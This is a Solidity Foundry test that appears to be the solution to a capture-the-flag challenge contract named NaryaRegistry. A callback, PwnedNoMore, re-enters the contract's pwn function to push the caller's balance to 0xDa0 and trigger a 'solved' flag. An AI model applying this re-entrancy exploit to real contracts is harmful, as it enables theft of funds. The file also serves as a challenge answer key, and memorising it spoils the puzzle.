// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import {Test, console2} from "forge-std/Test.sol";
import {NaryaRegistry} from "NaryaRegistry/contracts/NaryaRegistry.sol";

contract NaryaRegistryTest is Test {
    NaryaRegistry public naryaRegistry;

    function setUp() public {
        naryaRegistry = new NaryaRegistry();
    }

    function test_NaryaRegistrySolution() public {
        naryaRegistry.register();
        naryaRegistry.pwn(2);
        assertEq(naryaRegistry.balances(address(this)), 0xDa0);

        // vm.expectEmit();
        // emit NaryaRegistry.FLAG(address(this));
        naryaRegistry.identifyNaryaHacker();
        assertEq(naryaRegistry.NaryaHackers(address(this)), 1); // solved
    }
    function PwnedNoMore(uint256 kek) public {
        uint x = naryaRegistry.records1(address(this));
        if (kek != 59425114757512643212875124) {
            naryaRegistry.pwn(x + kek);
        }
    }
}

